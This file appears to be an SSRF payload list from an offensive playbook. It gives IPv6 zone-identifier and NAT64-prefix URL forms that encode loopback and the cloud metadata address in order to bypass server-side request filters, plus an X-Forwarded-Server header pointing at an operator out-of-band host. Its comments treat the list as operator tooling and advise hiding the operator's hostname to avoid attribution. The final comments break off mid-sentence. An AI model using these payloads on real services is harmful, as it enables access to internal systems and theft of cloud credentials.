# ssrf-address-forms.txt — alternate representations of the two addresses that matter
#
# Used by: ssrf-parser-confusion-rebind, webhook-ssrf-deblind, ssrf-fetch-by-url.
# The point of this list is NOT that any one form is magic. It is that a filter written as a
# string comparison, a regex, or a hand-rolled "is this private?" check has to normalize every
# one of these identically to the resolver the HTTP client uses. They almost never do.
#
# Rule of thumb: if the filter rejects the literal and accepts ONE of these, the filter is a
# string check and the whole lane is open. If it rejects all of them, it is resolving first and
# checking the resolved IP; go to the redirect and rebinding sections of the playbook instead.
#
# Placeholders: replace OOB_HOST with the operator listener hostname and REBIND_HOST with a
# rebinding domain you control. Never hardcode an operator hostname into a tracked file
# (see feedback-payload-hostnames-correlate-operator-identity).

## ---- IPv6 zone identifiers ----
# The %-separated zone id is part of the address grammar. Filters that parse the bracketed
# host with a plain IPv6 regex reject the address without the zone and accept it with one.
# Send the % both raw and percent-encoded (%25) -- some stacks decode before parsing.
http://[fe80::1%25eth0]/
http://[fe80::1%eth0]/
http://[::1%25lo]/
http://[fe80::1%251]/

## ---- NAT64 well-known prefixes ----
# 64:ff9b::/96 is the standard prefix; 64:ff9b:1::/48 is local-use and is the one hand-rolled
# filters and several off-the-shelf SSRF-filter libraries have historically failed to block.
http://[64:ff9b::a9fe:a9fe]/
http://[64:ff9b:1::a9fe:a9fe]/
http://[64:ff9b::7f00:1]/
http://[64:ff9b:1::7f00:1]/

# Not URL forms, but the same class with no URL parameter involved: a framework that rebuilds

# X-Forwarded-Server: OOB_HOST

# A perfectly ordinary public hostname whose A record points at private space. Nothing about the
